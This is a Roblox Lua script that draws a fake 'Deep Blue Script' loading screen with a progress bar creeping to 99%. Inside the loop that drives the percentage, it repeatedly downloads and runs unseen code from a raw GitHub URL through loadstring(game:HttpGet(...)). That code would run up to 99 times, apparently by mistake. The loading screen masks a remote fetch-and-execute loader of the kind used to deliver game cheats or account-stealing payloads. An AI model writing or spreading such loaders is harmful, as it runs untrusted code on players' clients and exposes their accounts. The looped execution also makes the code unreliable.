
-- Create GUI elements
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "Deep Blue Script Loading"

local background = Instance.new("Frame", gui)
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(10, 10, 50) -- Dark Blue

local loadingText = Instance.new("TextLabel", background)
loadingText.Text = "Loading Deep Blue Script"
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 28
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Size = UDim2.new(1, 0, 0, 50)
loadingText.Position = UDim2.new(0, 0, 0.4, 0)

local barBackground = Instance.new("Frame", background)
barBackground.Size = UDim2.new(0.6, 0, 0, 30)
barBackground.Position = UDim2.new(0.2, 0, 0.5, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 80)
barBackground.BorderSizePixel = 0

local barFill = Instance.new("Frame", barBackground)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0

local percentText = Instance.new("TextLabel", barBackground)
percentText.Text = "0%"
percentText.Font = Enum.Font.Gotham
percentText.TextSize = 18
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 1, 0)
percentText.Position = UDim2.new(0, 0, 0, 0)

-- Animate loading to 99%
local TweenService = game:GetService("TweenService")
local goalSize = UDim2.new(0.99, 0, 1, 0)
local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Linear)

local tween = TweenService:Create(barFill, tweenInfo, {Size = goalSize})
tween:Play()

-- Update percentage display
local percent = 0
while percent < 99 do
    percent += 1
    percentText.Text = percent .. "%"
    wait(5/99) -- Sync with 5 second tween
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jablowly222455/grow-a-garden-script-1/refs/heads/main/main.lua"))()
end
